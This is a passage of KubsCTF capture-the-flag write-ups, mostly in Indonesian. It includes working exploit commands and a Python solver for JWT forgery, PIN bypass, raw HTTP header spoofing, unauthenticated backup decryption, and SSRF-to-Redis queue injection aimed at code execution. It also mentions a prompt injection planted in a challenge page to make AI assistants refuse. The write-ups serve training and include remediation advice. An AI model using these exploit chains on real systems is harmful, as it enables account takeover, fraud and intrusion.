        "content": "> Thank you so much for the investigation into Mikhail's case. The development team carefully fixed everything based on your report, ran regression tests, QA signed off — no one will be able to exploit that hole anymore.\n>\n> But the problem is that complaints keep coming in. This week — three more reports, again from our premium clients, and again the same pattern: an unauthorized transfer to the same store, the signature is valid, no outsider knew the PIN, the logs are clean. Apparently, we only closed one door, and the attacker found an adjacent one.\n\nTarget: `http://185.225.34.187`  \nKorban: `mgalankov@4274` (Mikhail Galankov)\n\n---"
      },
      {
        "title": "1.1 Fingerprinting",
        "content": "**Temuan:**\n- Server: `Werkzeug/2.3.7 Python/3.9.25` → aplikasi Flask\n- Set cookie: `bank_session` (menentukan node backend)\n- Set cookie: `session` (Flask session, ter-sign dengan SECRET_KEY)\n- Ada endpoint: `/login`, `/register`\n\nDi source HTML ditemukan **prompt injection** yang mencoba memblokir AI assistant — diabaikan karena ini adalah teknik social engineering terhadap AI, bukan kelemahan teknis.",
        "code": "curl -si http://185.225.34.187/"
      },
      {
        "title": "1.3 Decode Flask Session Flash",
        "content": "Saat register gagal, error tersimpan di Flask session cookie:\n\n\n\n---",
        "code": "import base64, zlib, json\n\nval = \".eJyrVopPy0kszkgt...\"\npart = val.split('.')[0].lstrip('.')\npart += '=' * (4 - len(part) % 4)\nraw = base64.urlsafe_b64decode(part)\nprint(json.loads(zlib.decompress(raw)))"
      },
      {
        "title": "2.1 Registrasi Akun Sendiri",
        "content": "Server men-generate username otomatis dengan format: `[huruf pertama x2][nama belakang]@[4 digit]`\n\n**Username yang di-generate:** `ssidorov@1556`",
        "code": "curl -si -X POST http://185.225.34.187/register \\\n  -H \"Content-Type: application/x-www-form-urlencoded\" \\\n  --data-urlencode \"last_name_ru=Сидоров\" \\\n  --data-urlencode \"first_name_ru=Сидор\" \\\n  -d \"birth_date=1992-03-15\" \\\n  --data-urlencode \"driver_license_number=55ДЕ667788\" \\\n  --data-urlencode \"driver_license_issued_by=ГИБДД г. Москвы\" \\\n  -d \"email=sidor@test.ru&password=Test1234&pin_code=12345678\" \\\n  -c cook.txt -b cook.txt -L"
      },
      {
        "title": "2.2 Login",
        "content": "**JWT yang diterima:**\n\n\nDecode payload JWT:\n\n\n---",
        "code": "curl -si -X POST http://185.225.34.187/login \\\n  -H \"Content-Type: application/x-www-form-urlencoded\" \\\n  -d \"username=ssidorov@1556&password=Test1234\" \\\n  -c cook.txt -b cook.txt -L"
      },
      {
        "title": "3.1 Instalasi flask-unsign",
        "content": "",
        "code": "pip install flask-unsign --break-system-packages"
      },
      {
        "title": "3.2 Bruteforce Secret",
        "content": "**Secret ditemukan:** `ifeveryonecared3`\n\n> **Catatan:** Di soal 1, secret-nya adalah `facetoface`. Tim developer sudah mengganti secret, tapi masih menggunakan secret yang lemah dan ada di wordlist umum.\n\n---",
        "code": "flask-unsign \\\n  --wordlist /usr/share/wordlists/rockyou.txt \\\n  --unsign \\\n  --cookie \".eJyrVopPy0kszkgtVrKKrlZSKAFSSsWl...\" \\\n  --no-literal-eval"
      },
      {
        "title": "🎭 Tahap 4: Forge JWT untuk Mikhail",
        "content": "Karena secret JWT sama dengan Flask session secret, kita bisa membuat JWT palsu:\n\n\n\nDengan JWT ini kita bisa mengakses akun Mikhail (ACC004, saldo 1.4 juta rubel) termasuk `/flag_shop`.\n\n---",
        "code": "import jwt, time\n\nsecret = \"ifeveryonecared3\"\npayload = {\n    \"fresh\": False,\n    \"iat\": int(time.time()),\n    \"jti\": \"aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee\",\n    \"type\": \"access\",\n    \"sub\": \"4\",           # user_id Mikhail\n    \"nbf\": int(time.time()),\n    \"exp\": int(time.time()) + 3600,\n    \"username\": \"mgalankov@4274\"\n}\ntoken = jwt.encode(payload, secret, algorithm=\"HS256\")\nprint(token)"
      },
      {
        "title": "6.1 Endpoint Signature",
        "content": "Response:\n\n\n**Perbedaan kritis dari soal 1:**\n- Di soal 1: signature disimpan di **session cookie** (bisa di-forge karena secret lemah)\n- Di soal 2: signature **dikembalikan langsung** sebagai JSON response → tidak ada di session",
        "code": "curl -s -X POST http://185.225.34.187/api/get_signature \\\n  -b cook.txt \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"to_account\":\"FLAG_SHOP\",\"amount\":1000,\"description\":\"flag\",\"pin_code\":\"12345678\"}'"
      },
      {
        "title": "6.2 Kerentanan Ditemukan: Signature Tidak Terikat ke User",
        "content": "Server **tidak memverifikasi** apakah signature yang disubmit dibuat oleh user yang sama dengan yang melakukan transfer. Artinya:\n\n- Kita bisa generate signature dengan **akun kita sendiri** (PIN kita = `12345678`)\n- Signature tersebut bisa dipakai untuk transfer **atas nama Mikhail** (menggunakan JWT Mikhail)\n\nIni adalah kerentanan **Broken Object Level Authorization (BOLA/IDOR)** pada mekanisme signature.\n\n---"
      },
      {
        "title": "🚪 Tahap 7: Bypass PIN — Skip PIN Feature",
        "content": "Saat POST ke `/buy_flag`, server menampilkan halaman PIN. Di HTML tersembunyi ditemukan:\n\n\n\nTombol \"Tolak PIN\" di frontend secara diam-diam mengisi form tersembunyi dan submit ke `/transfer` dengan `skip_pin=1` — **tanpa meminta PIN sama sekali**.\n\n---",
        "code": "<form method=\"POST\" action=\"/transfer\" id=\"skipPinForm\" style=\"display: none;\">\n    <input type=\"hidden\" name=\"skip_pin\" value=\"1\">\n    <input type=\"hidden\" name=\"to_account\" value=\"FLAG_SHOP\">\n    <input type=\"hidden\" name=\"amount\" value=\"1000.0\">\n    <input type=\"hidden\" name=\"description\" value=\"Покупка: Флаг от CTF задания\">\n</form>\n\n<button type=\"button\" id=\"skipPinBtn\">Отказаться от PIN</button>"
      },
      {
        "title": "8.1 Dapatkan Offer Token",
        "content": "Dari Telegram bot `@flagi_and_bagi_for_kubstu2bot`:",
        "code": "/start\n/token\n→ TOKEN: ADxER3TV7WWeu6NSg8h2YTojOUJc0HZk"
      },
      {
        "title": "8.2 Generate Signature (Akun Kita)",
        "content": "",
        "code": "SIG_RESP=$(curl -s -X POST http://185.225.34.187/api/get_signature \\\n  -b cook.txt \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"to_account\":\"FLAG_SHOP\",\"amount\":1000,\"description\":\"Покупка: Флаг от CTF задания\",\"pin_code\":\"12345678\"}')\n\nSIG=$(echo $SIG_RESP | python3 -c \"import sys,json;d=json.load(sys.stdin);print(d['signature'])\")\nTS=$(echo $SIG_RESP | python3 -c \"import sys,json;d=json.load(sys.stdin);print(d['timestamp'])\")"
      },
      {
        "title": "8.3 Submit Transfer AS Mikhail (Cross-User Signature Abuse)",
        "content": "Response:",
        "code": "curl -si -X POST http://185.225.34.187/transfer \\\n  --cookie \"access_token_cookie=$MIKHAIL_JWT\" \\\n  -H \"Content-Type: application/x-www-form-urlencoded\" \\\n  --data-urlencode \"to_account=FLAG_SHOP\" \\\n  --data-urlencode \"amount=1000.0\" \\\n  --data-urlencode \"description=Покупка: Флаг от CTF задания\" \\\n  --data-urlencode \"product_id=1\" \\\n  --data-urlencode \"token=$TOKEN_BARU\" \\\n  -d \"transaction_signature=$SIG&transaction_timestamp=$TS\""
      },
      {
        "title": "🗺️ Diagram Exploit Chain",
        "content": "---",
        "code": "[Registrasi Akun] → [Login] → [Dapat JWT kita]\n        ↓\n[Bruteforce Flask Secret: ifeveryonecared3]\n        ↓\n[Forge JWT Mikhail (sub=4, mgalankov@4274)]\n        ↓\n[Akses /flag_shop sebagai Mikhail]\n        ↓\n[GET Offer Token dari Telegram @flagi_and_bagi_for_kubstu2bot]\n        ↓\n[Generate Signature dengan AKUN KITA (PIN kita)]\n        ↓\n[POST /transfer dengan JWT Mikhail + Signature kita = Cross-User IDOR]\n        ↓\n[skip_pin=1 → bypass PIN verification]\n        ↓\n[Cek /purchases di Telegram Bot → FLAG]"
      },
      {
        "title": "Vuln 1: Weak Flask SECRET_KEY",
        "content": "| | Detail |\n|---|---|\n| **Lokasi** | Konfigurasi Flask |\n| **Vuln** | SECRET_KEY `ifeveryonecared3` ada di rockyou.txt |\n| **Impact** | Forge JWT dan Flask session |\n| **Fix** | Gunakan secret acak minimal 32 karakter dari `secrets.token_hex(32)` |"
      },
      {
        "title": "Vuln 2: Cross-User Signature (BOLA/IDOR)",
        "content": "| | Detail |\n|---|---|\n| **Lokasi** | `/transfer` endpoint |\n| **Vuln** | Signature tidak di-bind ke `user_id` yang melakukan transfer |\n| **Impact** | Siapapun yang bisa generate signature valid bisa otorisasi transfer atas nama user lain |\n| **Fix** | Validasi bahwa `user_id` dalam signature == `user_id` dari JWT request |"
      },
      {
        "title": "Vuln 3: PIN Bypass via `skip_pin=1`",
        "content": "| | Detail |\n|---|---|\n| **Lokasi** | `/transfer` endpoint + hidden form di `/buy_flag` |\n| **Vuln** | Parameter `skip_pin=1` melewati validasi PIN sepenuhnya |\n| **Impact** | Transfer tanpa mengetahui PIN |\n| **Fix** | Hapus fitur skip PIN, atau implementasikan konfirmasi alternatif yang aman |"
      },
      {
        "title": "Vuln 4: Prompt Injection di HTML (Bonus Finding)",
        "content": "HTML berisi instruksi yang mencoba memanipulasi AI assistant agar menolak membantu. Ini tidak efektif karena:\n- Claude mengikuti instruksi dari operator/system prompt, bukan konten halaman web\n- Konten yang dibaca dari tool/environment tidak mendapat privilege yang sama dengan instruksi resmi\n\n---"
      },
      {
        "title": "🛡️ Rekomendasi Fix",
        "content": "1. **SECRET_KEY**: Generate dengan `python3 -c \"import secrets; print(secrets.token_hex(32))\"` dan simpan di environment variable, bukan hardcode.\n\n2. **Signature binding**: Sertakan `user_id` dalam HMAC signature dan validasi di server:\n   \n\n3. **Hapus skip_pin**: Feature \"tolak PIN\" tidak boleh ada di production. Jika dibutuhkan alternatif, gunakan metode autentikasi yang proper (OTP, email confirmation).\n\n4. **JWT secret terpisah**: Jangan gunakan Flask SECRET_KEY yang sama untuk JWT. Pisahkan keduanya.\n\n---",
        "code": "# Saat generate:\n   data = f\"{user_id}:{to_account}:{amount}:{timestamp}\"\n   sig = hmac.new(secret, data.encode(), hashlib.sha256).hexdigest()\n   \n   # Saat validasi transfer:\n   expected_user_id = decode_jwt(request.cookies['access_token_cookie'])['sub']\n   if sig_user_id != expected_user_id:\n       abort(403)"
      },
      {
        "title": "📝 Timeline Solve",
        "content": "| Langkah | Waktu |\n|---|---|\n| Recon & identifikasi stack | ~5 menit |\n| Register + decode flash error | ~10 menit |\n| Bruteforce Flask secret | ~15 menit |\n| Forge JWT Mikhail | ~5 menit |\n| Analisis signature mechanism | ~10 menit |\n| Temukan skip_pin bypass | ~5 menit |\n| Full exploit + flag | ~20 menit |\n| **Total** | **~70 menit** |\n\n---"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{p0dm3n4_p4r4m3tr0v_1zm3n1l4_summu_tr4nz4kts11}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsuctf-web-deadlock",
    "title": "CTF — Deadlock",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "KubsCTF",
    "tags": [],
    "description": "**Event:** KubSTU CTF  \n**Category:** Web  \n**Difficulty:** Medium  \n**Flag:** `KubSTU{Pipelined_Smuggling_Success_5521}`",
    "problemDescription": "| # | Vulnerability | Detail |\n|---|---|---|\n| 1 | **HTTP Request Smuggling / Pipelining** | Frontend dan backend dipisah di dua IP berbeda, memungkinkan attacker men-trigger keduanya secara bersamaan |\n| 2 | **Insufficient Admin Access Control** | Header `X-Admin-Access: true` dapat ditambahkan secara bebas oleh client tanpa validasi yang kuat |\n| 3 | **Exposed Internal Architecture** | Arsitektur frontend–backend yang terpisah dapat dieksploitasi dengan mengetahui IP masing-masing service |\n\n---",
    "tools": [
      "curl",
      "nc (netcat)"
    ],
    "analysis": "",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "> There and there. Frontend to backend and flag. It's simple. Take the flag from `/admin`.\n\n**Endpoints:**\n\n\n---",
        "code": "nc 155.212.217.42 5000\nnc 159.194.199.67 5000\nnc 31.128.47.156 5000"
      },
      {
        "title": "Step 1 — Identify the Protocol",
        "content": "Percobaan pertama menggunakan `curl` biasa ke port 5000 menghasilkan timeout tanpa response apapun:\n\n\n\nKarena soal memberikan alamat `nc`, dicoba koneksi raw TCP:\n\n\n\nServer berhasil connect tapi tidak mengirim apapun — mengindikasikan server menunggu input terlebih dahulu.",
        "code": "curl -sv --max-time 5 http://155.212.217.42:5000/"
      },
      {
        "title": "Step 2 — Identifikasi Perilaku \"Deadlock\"",
        "content": "Sesuai judul challenge **\"Deadlock\"** dan hint *\"Frontend to backend\"*, dicurigai bahwa:\n- Terdapat **dua service terpisah** di IP berbeda\n- Server **frontend** menunggu request masuk, lalu meneruskan ke **backend**\n- Keduanya harus di-trigger **bersamaan** untuk mendapat response\n\nPengujian dengan mengirim request ke dua IP berbeda secara bersamaan:\n\n\n\nTerminal 2 mendapatkan response:\n\n\n\nIni mengkonfirmasi arsitektur **frontend–backend** yang terpisah di dua IP berbeda.\n\n---",
        "code": "printf \"GET /admin HTTP/1.0\\r\\nHost: 155.212.217.42\\r\\n\\r\\n\" | nc -v 155.212.217.42 5000\n\nprintf \"GET /admin HTTP/1.0\\r\\nHost: 155.212.217.42\\r\\n\\r\\n\" | nc -v 159.194.199.67 5000"
      },
      {
        "title": "Step 3 — Bypass Admin Restriction",
        "content": "Dari screenshot Burp Suite yang terlihat di foto, ditemukan bahwa request ke `admin.challenge.local:8081` menggunakan header `X-Admin-Access: true`. Header ini dicoba ditambahkan ke request:",
        "code": "printf \"GET /admin HTTP/1.0\\r\\nHost: 155.212.217.42\\r\\nX-Admin-Access: true\\r\\n\\r\\n\" | nc -v 155.212.217.42 5000\n\nprintf \"GET /admin HTTP/1.0\\r\\nHost: 159.194.199.67\\r\\nX-Admin-Access: true\\r\\n\\r\\n\" | nc -v 159.194.199.67 5000"
      },
      {
        "title": "Remediation",
        "content": "1. **Validasi header di server-side** — Header seperti `X-Admin-Access` tidak boleh dipercaya dari client; gunakan autentikasi berbasis session/token yang diverifikasi server\n2. **Isolasi internal service** — Backend tidak boleh dapat diakses langsung dari publik; hanya frontend yang seharusnya berkomunikasi dengan backend melalui jaringan internal\n3. **Implementasi proper authentication** — Gunakan mekanisme autentikasi yang kuat (JWT, OAuth) daripada mengandalkan header custom\n\n---"
      },
      {
        "title": "Attack Flow",
        "content": "",
        "code": "curl timeout → server tidak reply HTTP biasa\n        │\n        ▼\nnc connect → server diam, nunggu input\n        │\n        ▼\nKirim raw HTTP ke dua IP berbeda bersamaan\n  155.212.217.42:5000 (Frontend)\n  159.194.199.67:5000 (Backend)\n        │\n        ▼\nBackend reply: \"Admin is restricted\"\n        │\n        ▼\nTambahkan header: X-Admin-Access: true\nTrigger kedua IP bersamaan\n        │\n        ▼\n200 OK → KubSTU{Pipelined_Smuggling_Success_5521}"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{Pipelined_Smuggling_Success_5521}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsuctf-web-mcpocalypse",
    "title": "MCPocalypse",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "KubsCTF",
    "tags": [],
    "description": "Writeup for challenge MCPocalypse",
    "problemDescription": "1. Enumerate the target and discover the Nginx UI panel on `212.8.228.176:9000`\n2. Reverse the frontend and identify `/api/backup`\n3. Confirm `/api/backup` is reachable without authentication\n4. Download the backup ZIP\n5. Read `X-Backup-Security`\n6. Decrypt inner archives with AES-256-CBC\n7. Extract Nginx configuration\n8. Discover `/flag`\n9. Request `/flag`\n10. Recover the flag",
    "tools": [],
    "analysis": "The Nginx configuration explicitly exposed the flag routes:\n\n```nginx\nlocation = /flag {\n    default_type text/plain;\n    alias /flag.txt;\n}\n\nlocation = /appflag {\n    default_type text/plain;\n    alias /app/flag.txt;\n}\n```\n\nThe database also contained interesting hints around `loopback-flag` and an internal proxy idea, but that was no longer necessary once the decrypted Nginx config revealed the public route directly.\n\nAt this point the simplest verification step was:\n\n```text\nhttp://212.8.228.176:8888/flag\n```\n\nAnd that returned the flag.",
    "solution": [
      {
        "title": "Challenge Information",
        "content": "- Category: Web\n- Challenge: `MCPocalypse`\n- Theme: insecure AI / Nginx management\n- Final flag:",
        "code": "KubSTU(mcp_h4s_n0_4uth_4nd_1_l0v3_1t)"
      },
      {
        "title": "TL;DR",
        "content": "The intended weakness was not a fancy prompt-injection chain.\n\nThe real issue was a **backup endpoint exposed without authentication**:\n\n\n\nThat endpoint returned:\n\n1. an encrypted backup ZIP\n2. the **AES key and IV** in the `X-Backup-Security` response header\n\nOnce the backup was decrypted, it exposed the Nginx configuration and the internal Nginx UI database. From there, the active Nginx config clearly revealed the flag endpoint:\n\n\n\nThen the flag was directly accessible from the public target:",
        "code": "GET /api/backup"
      },
      {
        "title": "Recon",
        "content": "The challenge description strongly suggested some kind of AI-assisted Nginx control:\n\n> \"CapyTech Solutions\" claims that their AI understands commands from half a word.\"\n\nTwo hosts were provided:\n\n- `http://155.212.186.115:8888`\n- `http://212.8.228.176:8888`\n\nInitial reconnaissance showed:\n\n- `155.212.186.115:8888` served a landing page\n- `212.8.228.176:8888` returned `capy nginx alive`\n\nThe landing page also leaked a development hint:\n\n\n\nThat pointed to a management panel on port `9000`.",
        "code": "<a href=\"http://localhost:9000\" class=\"btn-login\">...</a>\n<div class=\"dev-hint\">dev-port:9000</div>"
      },
      {
        "title": "Frontend Reverse Engineering",
        "content": "Pulling the JavaScript bundle exposed several useful API routes:\n\n- `POST /api/login`\n- `GET /api/install`\n- `GET /api/passkeys/config`\n- `GET /api/casdoor_uri`\n- `POST /api/restore`\n- `GET /api/backup`\n\nIt also showed that many requests used a custom crypto layer:\n\n- frontend requested `/api/crypto/public_key`\n- payloads were encrypted into an `encrypted_params` field\n\nThis was important because it meant plaintext requests to some endpoints would fail with:\n\n\n\nSo the next step was to reproduce the frontend encryption flow.",
        "code": "{\"scope\":\"middleware\",\"code\":40001,\"message\":\"decryption failed\"}"
      },
      {
        "title": "Reproducing Encrypted Requests",
        "content": "The target exposed:\n\n\n\nwithout authentication.\n\nThat returned an RSA public key. Using that key, it was possible to encrypt payloads exactly like the frontend did.\n\nThis allowed accurate testing of endpoints such as:\n\n- `/api/login`\n- `/api/install`\n- `/api/restore`\n\nEven with correct encryption, login quickly hit:\n\n\n\nSo brute forcing credentials was not the right direction.",
        "code": "POST /api/crypto/public_key"
      },
      {
        "title": "Discovering the Real Bug",
        "content": "While reviewing the backup-related frontend code, one route stood out:\n\n\n\nTesting it directly:\n\n\n\nreturned **200 OK** without authentication.\n\nThat was already a critical flaw.\n\nEven worse, the response included:\n\n\n\nSo the application did not only expose the encrypted backup, it also exposed the exact materials required to decrypt it.\n\nAt that point the challenge was effectively broken open.",
        "code": "createBackup(){ return r.get(\"/backup\", { responseType:\"blob\", returnFullResponse:true }) }"
      },
      {
        "title": "Understanding the Backup Format",
        "content": "To avoid guessing, I checked the official Nginx UI source code for the backup logic.\n\nThe relevant parts were:\n\n- `api/backup/backup.go`\n- `internal/backup/backup.go`\n- `internal/backup/backup_crypto.go`\n\nThe implementation confirmed:\n\n1. the backup endpoint generates a random AES key\n2. the AES key and IV are concatenated into `X-Backup-Security`\n3. inner files like `nginx-ui.zip` and `nginx.zip` are encrypted with **AES-256-CBC**\n4. the outer archive remains a normal ZIP\n\nIn other words, the attack path was:\n\n1. download outer backup ZIP\n2. read `X-Backup-Security`\n3. base64-decode key and IV\n4. decrypt the inner encrypted files with AES-CBC"
      },
      {
        "title": "Decrypting the Backup",
        "content": "The outer archive contained:\n\n- `hash_info.txt`\n- `nginx-ui.zip`\n- `nginx.zip`\n\nThe inner files were encrypted blobs. Using the leaked AES key and IV from `X-Backup-Security`, they decrypted cleanly into valid ZIP archives.\n\nAfter extracting them:"
      },
      {
        "title": "`nginx-ui.zip`",
        "content": "Contained:\n\n- `app.ini`\n- `database.db`"
      },
      {
        "title": "`nginx.zip`",
        "content": "Contained:\n\n- `nginx.conf`\n- `default.conf`\n- `capyflag.conf`\n- `conf.d/capyflag.conf`\n\nThat was enough to solve the challenge."
      },
      {
        "title": "Why This Worked",
        "content": "The core vulnerability was a **missing authorization check** on the backup endpoint.\n\nThat alone was severe because backups contained:\n\n- application config\n- database\n- Nginx configuration\n\nBut the implementation made it even worse by also returning the **decryption key and IV** in a response header:\n\n\n\nSo there was no cryptographic protection in practice. The encryption was purely cosmetic once the endpoint was reachable without auth.",
        "code": "X-Backup-Security: <AES key>:<IV>"
      },
      {
        "title": "Security Impact",
        "content": "This bug chain gives an attacker:\n\n- full read access to the application database\n- full read access to Nginx configuration\n- backup restore capability if desired\n- indirect access to internal service topology and hidden routes\n\nIn a real deployment, this would usually be enough for:\n\n- credential theft\n- token theft\n- lateral movement\n- configuration abuse\n- secret extraction"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solver.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\r\nimport base64\r\nimport io\r\nimport sys\r\nimport zipfile\r\nfrom pathlib import Path\r\n\r\nimport requests\r\nfrom Crypto.Cipher import AES\r\n\r\n\r\nTARGET = \"http://212.8.228.176:9000\"\r\nFLAG_TARGET = \"http://212.8.228.176:8888/flag\"\r\nOUTDIR = Path(\"solver_output\")\r\n\r\n\r\ndef pkcs7_unpad(data: bytes) -> bytes:\r\n    if not data:\r\n        raise ValueError(\"empty ciphertext\")\r\n    pad = data[-1]\r\n    if pad < 1 or pad > 16:\r\n        raise ValueError(f\"invalid padding byte: {pad}\")\r\n    if data[-pad:] != bytes([pad]) * pad:\r\n        raise ValueError(\"invalid PKCS#7 padding\")\r\n    return data[:-pad]\r\n\r\n\r\ndef aes_cbc_decrypt(ciphertext: bytes, key: bytes, iv: bytes) -> bytes:\r\n    cipher = AES.new(key, AES.MODE_CBC, iv)\r\n    return pkcs7_unpad(cipher.decrypt(ciphertext))\r\n\r\n\r\ndef main() -> int:\r\n    session = requests.Session()\r\n    OUTDIR.mkdir(exist_ok=True)\r\n\r\n    print(f\"[+] Downloading backup from {TARGET}/api/backup\")\r\n    backup_resp = session.get(f\"{TARGET}/api/backup\", timeout=20)\r\n    backup_resp.raise_for_status()\r\n\r\n    security = backup_resp.headers.get(\"X-Backup-Security\")\r\n    if not security or \":\" not in security:\r\n        raise RuntimeError(\"missing or malformed X-Backup-Security header\")\r\n\r\n    key_b64, iv_b64 = security.split(\":\", 1)\r\n    key = base64.b64decode(key_b64)\r\n    iv = base64.b64decode(iv_b64)\r\n\r\n    print(\"[+] Extracting outer backup ZIP\")\r\n    outer_zip = zipfile.ZipFile(io.BytesIO(backup_resp.content))\r\n    outer_names = outer_zip.namelist()\r\n    print(f\"[+] Outer archive entries: {outer_names}\")\r\n\r\n    for name in outer_names:\r\n        (OUTDIR / name).write_bytes(outer_zip.read(name))\r\n\r\n    print(\"[+] Decrypting inner archives with leaked AES key and IV\")\r\n    nginx_ui_ct = (OUTDIR / \"nginx-ui.zip\").read_bytes()\r\n    nginx_ct = (OUTDIR / \"nginx.zip\").read_bytes()\r\n\r\n    nginx_ui_pt = aes_cbc_decrypt(nginx_ui_ct, key, iv)\r\n    nginx_pt = aes_cbc_decrypt(nginx_ct, key, iv)\r\n\r\n    (OUTDIR / \"nginx-ui.zip.dec\").write_bytes(nginx_ui_pt)\r\n    (OUTDIR / \"nginx.zip.dec\").write_bytes(nginx_pt)\r\n\r\n    print(\"[+] Extracting decrypted archives\")\r\n    nginx_ui_dir = OUTDIR / \"nginx-ui\"\r\n    nginx_dir = OUTDIR / \"nginx\"\r\n    nginx_ui_dir.mkdir(exist_ok=True)\r\n    nginx_dir.mkdir(exist_ok=True)\r\n\r\n    with zipfile.ZipFile(io.BytesIO(nginx_ui_pt)) as zf:\r\n        zf.extractall(nginx_ui_dir)\r\n        print(f\"[+] nginx-ui archive entries: {zf.namelist()}\")\r\n\r\n    with zipfile.ZipFile(io.BytesIO(nginx_pt)) as zf:\r\n        zf.extractall(nginx_dir)\r\n        print(f\"[+] nginx archive entries: {zf.namelist()}\")\r\n\r\n    conf_candidates = [\r\n        nginx_dir / \"nginx.conf\",\r\n        nginx_dir / \"default.conf\",\r\n        nginx_dir / \"capyflag.conf\",\r\n        nginx_dir / \"conf.d\" / \"capyflag.conf\",\r\n    ]\r\n\r\n    print(\"[+] Relevant Nginx config snippets:\")\r\n    for path in conf_candidates:\r\n        if path.exists():\r\n            print(f\"\\n--- {path} ---\")\r\n            print(path.read_text(errors=\"replace\"))\r\n\r\n    print(f\"\\n[+] Requesting public flag endpoint: {FLAG_TARGET}\")\r\n    flag_resp = session.get(FLAG_TARGET, timeout=10)\r\n    flag_resp.raise_for_status()\r\n    flag = flag_resp.text.strip()\r\n\r\n    print(f\"[+] Flag: {flag}\")\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    try:\r\n        raise SystemExit(main())\r\n    except KeyboardInterrupt:\r\n        print(\"\\n[!] Interrupted\", file=sys.stderr)\r\n        raise SystemExit(130)"
      }
    ],
    "terminalOutputs": [],
    "flag": "```text\nKubSTU(mcp_h4s_n0_4uth_4nd_1_l0v3_1t)",
    "lessonsLearned": ""
  },
  {
    "id": "kubsuctf-web-repoforge",
    "title": "CTF — RepoForge",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "KubsCTF",
    "tags": [],
    "description": "**Event:** KubSTU CTF  \n**Category:** Web  \n**Difficulty:** Medium  \n**Flag:** `KubSTU{50b900eb985c28468640b012a3edbcec}`",
    "problemDescription": "| # | Vulnerability | Detail |\n|---|---|---|\n| 1 | **Git Import TCP SSRF** | `git://` import bisa diarahkan ke service internal dan menerima CRLF injection di path |\n| 2 | **Redis Exposed Internally Without Auth** | Redis menerima command mentah dari aplikasi import tanpa autentikasi |\n| 3 | **Unsafe Queue Deserialization / Constantization** | Worker class diambil langsung dari data queue dan di-constantize tanpa allowlist ketat |\n| 4 | **Dangerous Reflective Dispatch** | Job executor memanggil method dari argumen user-controlled pada object hasil `klass.new` |\n| 5 | **Sensitive Job Result Disclosure** | `/api/jobs/<jid>` memantulkan hasil eksekusi job, termasuk output berbahaya |\n\n---",
    "tools": [
      "curl",
      "Python",
      "Redis RESP payloads via"
    ],
    "analysis": "Dengan primitive yang sama, saya enumerasi key Redis:\n\n```text\nKEYS *\nSMEMBERS queues\nLRANGE queue:default 0 10\n```\n\nHasil penting:\n\n- Redis berjalan di `0.0.0.0:6379`\n- worker queue yang dipakai adalah `queue:default`\n- aplikasi juga memiliki endpoint `/api/jobs` yang menampilkan hasil eksekusi background jobs\n\nEndpoint `/api/jobs` menjadi oracle yang sangat berguna untuk melihat apakah payload queue berhasil diproses atau gagal.\n\n---",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "> RepoForge is a self-hosted code collaboration platform built by ForgeStack Inc. where teams manage repositories, run CI/CD pipelines, and coordinate deployments. The platform offers features similar to GitLab — project management, branch tracking, pipeline visualization, and a background job queue for async tasks like repository imports and webhook deliveries.\n>\n> As part of a security assessment, you have been given access to a standard user account on the platform. Your objective is to escalate your privileges and achieve remote code execution on the server.\n>\n> Explore the application carefully. Pay close attention to how the platform handles remote repository imports and what internal services might be accessible from the server. The platform supports multiple import protocols including HTTP, HTTPS, and Git.\n>\n> The flag is stored in /root/flag.txt and can only be retrieved through code execution on the server.\n\n**URL:** `https://501fe2e0-7eb0-499a-ae91-89f6852600c5.labs.hackadvisor.io/login`\n\n**Credentials:** `user@test.com / password123`\n\n---"
      },
      {
        "title": "Step 1 — Login and Inspect the Import Feature",
        "content": "Setelah login, fitur yang paling menarik ada di halaman **New Project** pada tab **Import Repository**. Form ini melakukan request ke:\n\n\n\ndengan body:\n\n\n\nDeskripsi challenge juga memberi petunjuk kuat bahwa fitur import repository adalah kunci exploit.",
        "code": "POST /api/projects/import\nContent-Type: application/json"
      },
      {
        "title": "Step 2 — Test `git://` Import Behavior",
        "content": "RepoForge mengizinkan URL `git://`, jadi saya coba arahkan import ke service internal:\n\n\n\nProject hasil import menampilkan log berikut:\n\n\n\nIni membuktikan dua hal:\n\n- import `git://` benar-benar membuat koneksi TCP dari server ke host internal\n- karakter CRLF di path bisa menyuntikkan command mentah ke service internal\n\nDengan kata lain, fitur import memberi **raw TCP SSRF / protocol smuggling** ke Redis internal.",
        "code": "git://0.0.0.0:6379/%0D%0ASMEMBERS%20workers%0D%0A"
      },
      {
        "title": "Step 4 — Confirm Queue Injection",
        "content": "Alih-alih hanya membaca Redis, saya dorong job palsu langsung ke queue:\n\n\n\nPayload ini dikirim sebagai RESP agar Redis memprosesnya dengan benar. Setelah itu, `/api/jobs` menampilkan job gagal dengan `worker_class` yang sama. Artinya:\n\n- queue injection berhasil\n- aplikasi benar-benar memproses job dari Redis",
        "code": "RPUSH queue:default {\"class\":\"ZzzProbeWorker\",\"args\":[\"probe\"],\"jid\":\"<random>\"}"
      },
      {
        "title": "Step 5 — Understand How Jobs Are Executed",
        "content": "Saya kemudian mencoba beberapa class Ruby bawaan seperti `File`, `Kernel`, dan `String`. Hasil di `/api/jobs/<jid>` membocorkan pola eksekusi worker:\n\n\n\ndan\n\n\n\nDari error ini terlihat worker melakukan sesuatu yang ekuivalen dengan:\n\n\n\nItu berarti class `String` bisa dijadikan gadget eksekusi Ruby arbitrer, karena:\n\n- `String.new` valid dan menghasilkan string kosong\n- string kosong punya method `instance_eval`",
        "code": "{\"worker_class\":\"String\",\"result\":\"undefined method `abc' for \\\"\\\":String\"}"
      },
      {
        "title": "Step 6 — Turn It Into RCE",
